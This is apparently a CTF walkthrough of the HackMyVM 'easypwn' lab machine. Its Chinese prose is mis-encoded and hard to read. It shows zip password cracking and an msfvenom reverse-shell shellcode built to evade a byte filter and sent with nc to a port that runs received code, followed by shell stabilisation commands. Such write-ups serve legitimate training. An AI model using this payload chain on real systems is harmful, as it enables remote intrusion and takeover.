---
title: easypwn
author: hgbe02
date: 2025-06-10 18:45:26 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,pwn]  
permalink: "/Hackmyvm/easypwn.html"
---

# easypwn

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849644.png" alt="image-20250610085532920" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849646.png" alt="image-20250610085654827" style="zoom:50%;" />

## ä¿¡æ¯æœé›†

### ç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ rustscan -a $IP -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.102:22
Open 192.168.10.102:80
Open 192.168.10.102:6666

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKpc4iyFhIzxDvlJoPvgE9rRlFPOqHm4EkLgqXQkVf31csyjpvJgyZpTgr4gYV3oztsMmQbIj+nFGD+L5pQfaSXtAdxKpqt4D/MnFqVKP6KKGFhATWMCDzGXRaXQyaF7dOq49vkIoptczAU2af2PfwycA3aaI/lNPOYSHPRufkm102lE/lHZzNbXh0yJJXy9RJaqELeAibmqdrHFNpXFT8qAvsQrz/6IKJkia4JLdVbfeMdZBOQ9lIlQg+2VfKXp7pF7kGZKKttIThc8ROqlcOaxlmuC5oKEgFQP7obty1+6fx/QIuNn3D05FeQMqbvJfFZF1dE2IH4WEbFWRGH6w1
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYupwIuJVRtRMDrYZ6fR/3p5E5vsqXADwGAoZ2RW5vKPxDV3j/+QjGbnRDj1iD5/iwZxxlUggSr5raZfzAHrZA=
|   256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOshh8VG4l9hWlVYWfAvLuWuwPEdiF8EXmm5BFib/+q
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Don't Hack Me
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.59 (Debian)
6666/tcp open  irc?    syn-ack ttl 64
|_irc-info: Unable to open connection
| fingerprint-strings: 
|   Help, Socks4, Socks5: 
|     Hackers, get out of my machine
|   beast2: 
|_    start: 11
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6666-TCP:V=7.95%I=7%D=6/9%Time=68478310%P=x86_64-pc-linux-gnu%r(Hel
SF:p,3C,"Hackers,\x20get\x20out\x20of\x20my\x20machine\n\[\*\]\x20\xe7\xad
SF:\x89\xe5\xbe\x85\xe5\xae\xa2\xe6\x88\xb7\xe7\xab\xaf\xe8\xbf\x9e\xe6\x8
SF:e\xa5\.\.\.\n")%r(Socks5,3C,"Hackers,\x20get\x20out\x20of\x20my\x20mach
SF:ine\n\[\*\]\x20\xe7\xad\x89\xe5\xbe\x85\xe5\xae\xa2\xe6\x88\xb7\xe7\xab
SF:\xaf\xe8\xbf\x9e\xe6\x8e\xa5\.\.\.\n")%r(Socks4,3C,"Hackers,\x20get\x20
SF:out\x20of\x20my\x20machine\n\[\*\]\x20\xe7\xad\x89\xe5\xbe\x85\xe5\xae\
SF:xa2\xe6\x88\xb7\xe7\xab\xaf\xe8\xbf\x9e\xe6\x8e\xa5\.\.\.\n")%r(beast2,
SF:1E,"\n\[!\]\x20start:\x2011\xef\xbc\x8c\xe6\x9c\x8d\xe5\x8a\xa1\xe7\xbb
SF:\x88\xe6\xad\xa2\n");
MAC Address: 08:00:27:6E:39:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ç›®å½•æ‰«æ

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ feroxbuster -u http://$IP/ -x php html txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.10.102/
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, html, txt]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       36l       77w      930c http://192.168.10.102/
200      GET       36l       77w      930c http://192.168.10.102/index.html
200      GET       17l       42w      383c http://192.168.10.102/mysecret.txt
[####################] - 2m    882184/882184  0s      found:3       errors:4923   
[####################] - 2m    882184/882184  7429/s  http://192.168.10.102/ 
```

## æ¼æ´å‘ç°

### è¸©ç‚¹

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849647.png" alt="image-20250610090156750" style="zoom:50%;" />

### ä¿¡æ¯æœé›†

å°è¯•æœé›†å­—å…¸ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ curl -s http://192.168.10.102/mysecret.txt                                                                                                   
Go to the most evil port.
You will get what you want.
Please be gentle with him, maybe he will be afraid.
In order to obtain its source code.
Perhaps you will need the dictionary below.


å»é‚£ä¸ªæœ€é‚ªæ¶çš„ç«¯å£ã€‚
ä½ ä¼šå¾—åˆ°ä½ æƒ³è¦çš„ã€‚
è¯·å¯¹ä»–æ¸©æŸ”ä¸€ç‚¹ï¼Œä¹Ÿè®¸å®ƒä¼šå®³æ€•ã€‚
ä¸ºäº†å¾—åˆ°å®ƒçš„æºç ã€‚
ä¹Ÿè®¸ä½ ä¼šéœ€è¦ä¸‹é¢çš„å­—å…¸ã€‚




/YTlPX4d2UENbWnI.txt

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ curl -s http://192.168.10.102/YTlPX4d2UENbWnI.txt
ta0
lingmj
bamuwe
todd
ll104567
primary
lvzhouhang
qiaojojo
flower

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ curl -s http://192.168.10.102/YTlPX4d2UENbWnI.txt > dict

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ dirsearch -u http://$IP/ -w dict 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 9

Output File: /home/kali/temp/easypwn/reports/http_192.168.10.102/__25-06-09_21-05-48.txt

Target: http://192.168.10.102/

[21:05:48] Starting: 
[21:05:49] 200 -  722KB - /ll104567

Task Completed

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ wget http://192.168.10.102/ll104567
--2025-06-09 21:06:23--  http://192.168.10.102/ll104567
Connecting to 192.168.10.102:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 739584 (722K)
Saving to: â€˜ll104567â€™

ll104567                                        100%[====================================================================================================>] 722.25K  --.-KB/s    in 0.03s   

2025-06-09 21:06:24 (25.1 MB/s) - â€˜ll104567â€™ saved [739584/739584]

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ ll
total 732
-rw-rw-r-- 1 kali kali     68 Jun  9 21:04 dict
-rw-rw-r-- 1 kali kali 739584 Feb 24 08:14 ll104567
drwxrwxr-x 3 kali kali   4096 Jun  9 21:05 reports

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ file ll104567                                     
ll104567: Zip archive data, at least v2.0 to extract, compression method=deflate

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ unzip ll104567 
Archive:  ll104567
[ll104567] opt/server password:    
```

æ˜¾ç¤ºéœ€è¦å¯†ç ã€‚ã€‚ã€‚å°è¯•è¿›è¡Œç ´è§£ï¼š

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ zip2john ll104567 > hash
ver 2.0 efh 5455 efh 7875 ll104567/opt/server PKZIP Encr: TS_chk, cmplen=739398, decmplen=2120576, crc=1B8B19DF ts=4118 cs=4118 type=8

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
oooooo           (ll104567/opt/server)     
1g 0:00:00:00 DONE (2025-06-09 21:08) 5.000g/s 20480p/s 20480c/s 20480C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ unzip ll104567
Archive:  ll104567
[ll104567] opt/server password: 
  inflating: opt/server

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ file opt/server                       
opt/server: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=db87ec3af59f50fcd961031784692ff086072fd2, not stripped

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ checksec --file=opt/server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   7096 Symbols      No    0               0               opt/server
```

ç¬¬ä¸€ä¸ª`pwn`æ¥äº†ï¼Œæ”¾åˆ°`ida`çœ‹ä¸€ä¸‹ï¼Œå®šä½åˆ°äº†ä¸€äº›ä»£ç ï¼š

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  int result; // eax
  __int64 v5; // rax
  std::ostream *v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  size_t v9; // rax
  unsigned __int64 v10; // rsi
  __int64 v11; // rax
  char buf[4108]; // [rsp+0h] [rbp-1070h]
  int v13; // [rsp+100Ch] [rbp-64h]
  __int16 v14; // [rsp+1010h] [rbp-60h]
  char v15[6]; // [rsp+1012h] [rbp-5Eh]
  void (*v16)(void); // [rsp+1028h] [rbp-48h]
  char *v17; // [rsp+1030h] [rbp-40h]
  char v18; // [rsp+103Fh] [rbp-31h]
  const char *v19; // [rsp+1040h] [rbp-30h]
  void *v20; // [rsp+1048h] [rbp-28h]
  unsigned __int64 len; // [rsp+1050h] [rbp-20h]
  unsigned int v22; // [rsp+1058h] [rbp-18h]
  unsigned int fd; // [rsp+105Ch] [rbp-14h]
  char *v24; // [rsp+1060h] [rbp-10h]
  int i; // [rsp+1068h] [rbp-8h]
  bool v26; // [rsp+106Fh] [rbp-1h]

  ssignal(11LL, signal_handler, envp);
  ssignal(13LL, signal_handler, v3);
  v13 = 1;
  fd = socket(2LL, 1LL, 0LL);
  if ( fd == 0 )
  {
    perror(&unk_53C02D, 1LL);
    result = 1;
  }
  else if ( (unsigned int)setsockopt(fd, 1LL, 2LL, &v13, 4LL) != 0 )
  {
    perror(&unk_53C044, 1LL);
    close(fd);
    result = 1;
  }
  else
  {
    v14 = 2;
    *(_DWORD *)&v15[2] = 0;
    *(_DWORD *)v15 = (unsigned __int16)ntohs(6666LL);
    if ( (signed int)bind(fd, &v14, 16LL) >= 0 )
    {
      if ( (signed int)listen(fd, 5LL) >= 0 )
      {
        v5 = std::operator<<<std::char_traits<char>>((std::ostream *)&std::cout);
        v6 = (std::ostream *)std::ostream::operator<<(v5, 6666LL);
        v7 = std::operator<<<std::char_traits<char>>(v6);
        std::ostream::operator<<(v7, std::endl<char,std::char_traits<char>>);
        while ( 1 )
        {
          while ( 1 )
          {
            v8 = std::operator<<<std::char_traits<char>>((std::ostream *)&std::cout);
            std::ostream::operator<<(v8, std::endl<char,std::char_traits<char>>);
            v22 = accept(fd, 0LL, 0LL);
            if ( (v22 & 0x80000000) == 0 )
              break;
            perror(&unk_53C0C9, 0LL);
          }
          dup2(v22, 0LL);
          dup2(v22, 1LL);
          dup2(v22, 2LL);
          close(v22);
          len = read(0, buf, 0x1000uLL);
          v26 = (signed __int64)len > 0;
          for ( i = 0; v26 == 1 && (signed __int64)len > i; ++i )
          {
            v20 = &forbidden_bytes;
            v24 = (char *)&forbidden_bytes;
            v19 = "\n[!] start: ";
            while ( 1 )
            {
              if ( v24 == v19 )
                goto LABEL_20;
              v18 = *v24;
              if ( v18 == buf[i] )
                break;
              ++v24;
            }
            v26 = 0;
LABEL_20:
            if ( v26 != 1 )
              break;
          }
          if ( v26 == 1 )
          {
            v10 = len;
            v16 = (void (*)(void))mmap64(0LL, len, 7uLL, 0x22uLL, 0xFFFFFFFFuLL, 0LL);
            if ( v16 == (void (*)(void))-1LL )
            {
              perror(&unk_53C108, v10);
              close(v22);
            }
            else
            {
              j_memcpy(v16, buf, len);
              v16();
              munmap(v16, len);
              v11 = std::operator<<<std::char_traits<char>>((std::ostream *)&std::cout);
              std::ostream::operator<<(v11, std::endl<char,std::char_traits<char>>);
            }
          }
          else
          {
            v17 = "Hackers, get out of my machine\n";
            v9 = j_strlen_ifunc("Hackers, get out of my machine\n", buf);
            write(1u, v17, v9);
            close(v22);
          }
        }
      }
      perror(&unk_53C078, 5LL);
      close(fd);
      result = 1;
    }
    else
    {
      perror(&unk_53C061, &v14);
      close(fd);
      result = 1;
    }
  }
  return result;
}
```

ä¸¢ç»™`AI`çœ‹å§ï¼Œæˆ‘çœ‹å¸ˆå‚…ä»¬å¥½åƒéƒ½æ˜¯è¿™ä¹ˆå¹²çš„ã€‚ã€‚ã€‚ã€‚

> æ ¹æ®æä¾›çš„åæ±‡ç¼–ä»£ç åˆ†æï¼Œè¯¥ç¨‹åºå®ç°äº†ä¸€ä¸ª**å…·æœ‰åŸºç¡€å®‰å…¨é˜²æŠ¤çš„Shellcodeæ‰§è¡ŒæœåŠ¡å™¨**ã€‚ä»¥ä¸‹æ˜¯å…¶æ ¸å¿ƒåŠŸèƒ½å’Œæ‰§è¡Œæµç¨‹çš„è§£æï¼š
>
> ------
>
> ### ğŸ”§ 1. **åˆå§‹åŒ–ä¸Socketè®¾ç½®**
>
> - **ä¿¡å·å¤„ç†**ï¼šæ³¨å†Œ`SIGSEGV`å’Œ`SIGPIPE`çš„ä¿¡å·å¤„ç†å™¨ï¼Œç”¨äºæ•è·éæ³•å†…å­˜è®¿é—®æˆ–ç®¡é“æ–­è£‚å¼‚å¸¸ã€‚
>
> - Socketé…ç½®ï¼š
>
>   - åˆ›å»ºTCP Socketï¼ˆ`socket(2, 1, 0)`ï¼‰ï¼Œåè®®ç±»å‹ä¸ºIPv4ï¼ˆ`AF_INET`ï¼‰ã€‚
>- è®¾ç½®`SO_REUSEADDR`é€‰é¡¹ï¼ˆ`setsockopt`ï¼‰ï¼Œå…è®¸ç«¯å£å¤ç”¨ã€‚
>   - ç»‘å®šç«¯å£6666ï¼ˆ`bind(fd, &v14, 16)`ï¼‰ï¼Œå…¶ä¸­`v14`å­˜å‚¨åœ°å€æ—ï¼ˆ`AF_INET=2`ï¼‰å’Œç«¯å£å·ï¼ˆ`htons(6666)`ï¼‰ã€‚
>- å¯åŠ¨ç›‘å¬ï¼ˆ`listen(fd, 5)`ï¼‰ï¼Œæœ€å¤§è¿æ¥é˜Ÿåˆ—ä¸º5ã€‚
> 
> ------
> 
> ### ğŸ”„ 2. **å®¢æˆ·ç«¯è¿æ¥å¤„ç†å¾ªç¯**
>
> 1. æ¥å—è¿æ¥ï¼š
>   - é€šè¿‡`accept()`æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥ï¼Œè¿”å›æ–°Socketæè¿°ç¬¦ï¼ˆ`v22`ï¼‰ã€‚
>    - è‹¥å¤±è´¥ï¼ˆå¦‚è¿”å›è´Ÿæ•°ï¼‰ï¼Œè¾“å‡ºé”™è¯¯å¹¶ç»§ç»­ç­‰å¾…ã€‚
>2. I/Oé‡å®šå‘ï¼š
>    - ä½¿ç”¨`dup2`å°†å®¢æˆ·ç«¯Socketé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯ï¼ˆ0ã€1ã€2ï¼‰ï¼Œä½¿åç»­æ“ä½œå¯ç›´æ¥è¯»å†™ç½‘ç»œæ•°æ®ã€‚
>    - å…³é—­åŸå®¢æˆ·ç«¯Socketï¼ˆ`close(v22)`ï¼‰ã€‚
> 3. è¯»å–æ•°æ®ï¼š
>    - ä»å®¢æˆ·ç«¯è¯»å–æœ€å¤š4096å­—èŠ‚ï¼ˆ`read(0, buf, 0x1000)`ï¼‰åˆ°ç¼“å†²åŒº`buf`ã€‚
> 
> ------
> 
> ### âš ï¸ 3. **å®‰å…¨æ£€æµ‹ä¸æ‰§è¡Œæ§åˆ¶**
>
> - å±é™©å­—ç¬¦è¿‡æ»¤ï¼š
>  - éå†ç¼“å†²åŒºæ•°æ®ï¼Œæ£€æŸ¥æ˜¯å¦åŒ…å«`forbidden_bytes`ä¸­çš„ç¦ç”¨å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦`\n`æˆ–ç‰¹å®šæ§åˆ¶å­—ç¬¦ï¼‰ã€‚
>   - è‹¥æ£€æµ‹åˆ°ç¦ç”¨å­—ç¬¦ï¼Œè®¾ç½®æ ‡å¿—`v26=0`å¹¶è·³å‡ºå¾ªç¯ã€‚
>- åŠ¨æ€ä»£ç æ‰§è¡Œï¼š
>   - è‹¥æ•°æ®é€šè¿‡è¿‡æ»¤`ï¼ˆv26==1ï¼‰`ï¼š
>     - é€šè¿‡`mmap`åˆ†é…å¯è¯»å†™æ‰§è¡Œçš„å†…å­˜åŒºåŸŸï¼ˆ`PROT_READ|WRITE|EXEC, MAP_ANONYMOUS|PRIVATE`ï¼‰ã€‚
>     - å°†ç¼“å†²åŒºæ•°æ®å¤åˆ¶åˆ°è¯¥å†…å­˜ï¼ˆ`memcpy`ï¼‰ã€‚
>     - **ç›´æ¥æ‰§è¡Œå†…å­˜ä¸­çš„ä»£ç **ï¼ˆ`v16()`ï¼Œå³Shellcodeï¼‰ã€‚
>     - æ‰§è¡Œåé‡Šæ”¾å†…å­˜ï¼ˆ`munmap`ï¼‰ã€‚
>   - è‹¥æ•°æ®æœªé€šè¿‡è¿‡æ»¤ï¼š
>     - è¿”å›é”™è¯¯ä¿¡æ¯`"Hackers, get out of my machine\n"`ã€‚
> 
> ------
> 
> ### ğŸ“¢ 4. **è¾“å‡ºä¸æ—¥å¿—**
>
> - æœåŠ¡å¯åŠ¨æ—¶è¾“å‡ºç›‘å¬ç«¯å£ï¼ˆ`std::cout << "Listening on 6666"`ï¼‰ã€‚
>- æ¯æ¬¡å®¢æˆ·ç«¯è¿æ¥åæ‰“å°æ¢è¡Œç¬¦ï¼ˆ`std::cout << std::endl`ï¼‰ï¼Œå¯èƒ½ç”¨äºæ—¥å¿—åˆ†éš”ã€‚
> - Shellcodeæ‰§è¡ŒæˆåŠŸæ—¶è¾“å‡ºç©ºè¡Œï¼ˆ`std::cout << std::endl`ï¼‰ã€‚
>
> ------
> 
> ### âš ï¸ å®‰å…¨é£é™©æç¤º
>
> 1. **é«˜å±è¡Œä¸º**ï¼šç›´æ¥æ‰§è¡Œç½‘ç»œä¼ å…¥çš„ä»£ç ï¼ˆShellcodeï¼‰æ˜¯æåº¦å±é™©çš„ï¼Œå¯èƒ½è¢«ç”¨äºè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ”»å‡»ã€‚
>2. **è¿‡æ»¤æœºåˆ¶å±€é™**ï¼šä»…é€šè¿‡å­—ç¬¦é»‘åå•ï¼ˆ`forbidden_bytes`ï¼‰é˜²æŠ¤ï¼Œæ˜“è¢«ç»•è¿‡ï¼ˆå¦‚ç¼–ç æ··æ·†æˆ–æœªè¦†ç›–çš„æŒ‡ä»¤ï¼‰ã€‚
> 3. **æœªéªŒè¯æ¥æº**ï¼šæ— å®¢æˆ·ç«¯IPæˆ–èº«ä»½è®¤è¯ï¼Œå¼€æ”¾ç«¯å£å¯èƒ½è¢«æ¶æ„åˆ©ç”¨ã€‚
>
> ------
> 
> ### ğŸ“Œ åŠŸèƒ½æ€»ç»“
>
> | **é˜¶æ®µ**   | **æ“ä½œ**                          | **å…³é”®å‡½æ•°/æŒ‡ä»¤**           |
>| ---------- | --------------------------------- | --------------------------- |
> | åˆå§‹åŒ–     | ä¿¡å·å¤„ç†ã€Socketç»‘å®šç«¯å£6666      | `ssignal`, `socket`, `bind` |
>| å®¢æˆ·ç«¯è¿æ¥ | æ¥å—è¿æ¥ã€I/Oé‡å®šå‘               | `accept`, `dup2`, `close`   |
> | æ•°æ®å¤„ç†   | è¯»å–æ•°æ®å¹¶è¿‡æ»¤å±é™©å­—ç¬¦            | `read`, å­—ç¬¦éå†æ£€æŸ¥        |
> | åŠ¨æ€æ‰§è¡Œ   | æ˜ å°„å†…å­˜å¹¶æ‰§è¡ŒShellcode           | `mmap`, `memcpy`, `v16()`   |
> | ç»“æœåé¦ˆ   | æˆåŠŸæ‰§è¡Œè¾“å‡ºç©ºè¡Œ/å¤±è´¥è¿”å›é”™è¯¯ä¿¡æ¯ | `std::cout`, `write`        |
> 
> > ğŸ’¡ è¯¥ç¨‹åºæœ¬è´¨æ˜¯ä¸€ä¸ª**ç®€æ˜“çš„ShellcodeåŠ è½½å™¨**ï¼Œé€‚ç”¨äºæ¸—é€æµ‹è¯•æˆ–CTFåœºæ™¯ï¼Œä½†å®é™…éƒ¨ç½²éœ€ä¸¥æ ¼è¯„ä¼°é£é™©ã€‚è‹¥éœ€è¿›ä¸€æ­¥åˆ†æè¿‡æ»¤è§„åˆ™ï¼ˆ`forbidden_bytes`ï¼‰æˆ–ä¼˜åŒ–å®‰å…¨è®¾è®¡ï¼Œå»ºè®®ç»“åˆåŠ¨æ€è°ƒè¯•å·¥å…·ï¼ˆå¦‚GDBï¼‰éªŒè¯è¡Œä¸ºã€‚

è‡³äºä»£ç ä¸­ç¦æ­¢éƒ¨åˆ†å­—ç¬¦ï¼Œå¯ä»¥çŸ¥é“ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849648.png" alt="image-20250610101717509" style="zoom:50%;" />

> ### âš ï¸ ç¦æ­¢å­—ç¬¦åˆ—è¡¨ï¼ˆåå…­è¿›åˆ¶å€¼åŠå«ä¹‰ï¼‰
>
> | åå…­è¿›åˆ¶å€¼ |    ASCII å­—ç¬¦     |                          å«ä¹‰/åŸå›                            |
> | :--------: | :---------------: | :----------------------------------------------------------: |
> |   `0x00`   |   `\x00` (NULL)   | **ç©ºå­—èŠ‚**ï¼šå­—ç¬¦ä¸²ç»ˆæ­¢ç¬¦ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æˆªæ–­æˆ–å‡½æ•°æå‰ç»ˆæ­¢ï¼ˆå¦‚ `strcpy`ï¼‰ã€‚ |
> |   `0x20`   |       ç©ºæ ¼        | **ç©ºæ ¼ç¬¦**ï¼šåœ¨ç‰¹å®šè¾“å…¥è¿‡æ»¤åœºæ™¯å¯èƒ½è¢«é™åˆ¶ï¼Œä½†æ­¤å¤„éœ€ç»“åˆä¸Šä¸‹æ–‡ç¡®è®¤ã€‚ |
> |   `0x0F`   |   SI (Shift In)   |       **æ§åˆ¶å­—ç¬¦**ï¼šä¸å¯è§å­—ç¬¦ï¼Œå¯èƒ½å¹²æ‰°æ•°æ®å¤„ç†æµç¨‹ã€‚       |
> |   `0xCD`   |        `Ã`        |  **æ‰©å±• ASCII å­—ç¬¦**ï¼šåœ¨ç‰¹å®šç¼–ç ç¯å¢ƒå¯èƒ½è¢«è§£æä¸ºå¼‚å¸¸å€¼**ã€‚   |
> |   `0x09`   | `\t` (æ°´å¹³åˆ¶è¡¨ç¬¦) |       **ç©ºç™½ç¬¦**ï¼šå¯èƒ½è¢«è§£æä¸ºåˆ†éš”ç¬¦ï¼Œå½±å“æ•°æ®å®Œæ•´æ€§ã€‚       |
> |   `0x22`   |   `"` (åŒå¼•å·)    | **ç‰¹æ®Šç¬¦å·**ï¼šåœ¨å‘½ä»¤è¡Œæˆ–å­—ç¬¦ä¸²å¤„ç†ä¸­å¯èƒ½å¼•å‘è¯­æ³•é”™è¯¯æˆ–æ³¨å…¥é£é™©ã€‚ |
> |   `0x0A`   |   `\n` (æ¢è¡Œç¬¦)   | **æ¢è¡Œç¬¦**ï¼šå¸¸è§è¾“å…¥ç»ˆæ­¢ç¬¦ï¼Œå¯èƒ½å¯¼è‡´è¯»å–æ“ä½œæå‰ç»“æŸï¼ˆå¦‚ `read` å‡½æ•°ï¼‰ã€‚ |

### ç”Ÿæˆshellcode

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.10.106 LPORT=1234 -b '\x00\x20\x0f\xcd\x09\x22\x0a' -f raw > payload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
```

### åŠ è½½shellcode

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/easypwn]
â””â”€$ nc $IP 6666 < payload      
```

å¦ä¸€è¾¹å°±å¼¹è¿‡æ¥äº†ã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849649.png" alt="image-20250610110132979" style="zoom:50%;" />

## ææƒ

### ç¨³å®šshell

æ‚²ä¼¤.jpg æ¢äº†ä¸€ä¸ª`kali`ï¼Œ`pwncat-cs`ç”¨ä¸äº†äº†ï¼š

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
stty size
stty rows 38 columns 116
```

æˆ‘æ²¡ç”¨ä¸Šè¿°å‘½ä»¤ï¼Œæˆ‘é€‰æ‹©ä¿®äº†ä¸€ä¸‹ä¿ºçš„`pwncat-cs`ã€‚ã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849650.png" alt="image-20250610113754830" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506101849651.png" alt="image-20250610113809510" style="zoom:50%;" />

### ä¿¡æ¯æœé›†

```bash
(remote) lamb@pwnding:/home/lamb$ ls -la
total 28
drwxr-xr-x 2 lamb lamb 4096 Feb 24 07:52 .
drwxr-xr-x 3 root root 4096 Feb 19 20:34 ..
lrwxrwxrwx 1 lamb lamb    9 Feb 19 09:27 .bash_history -> /dev/null
